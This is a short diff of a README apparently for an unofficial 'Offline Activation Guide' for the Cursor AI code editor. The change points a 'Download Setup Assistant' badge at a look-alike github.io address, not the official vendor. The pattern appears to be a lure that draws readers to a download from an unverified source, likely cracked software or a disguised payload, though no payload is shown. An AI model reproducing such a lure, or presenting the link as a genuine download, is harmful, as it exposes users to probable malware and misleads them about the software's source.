@@ -1,6 +1,6 @@
 # Cursor – AI Code Editor — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://cursor-ai-editor.github.io/.github/)
 
 ## ⚙️ How to Use
 
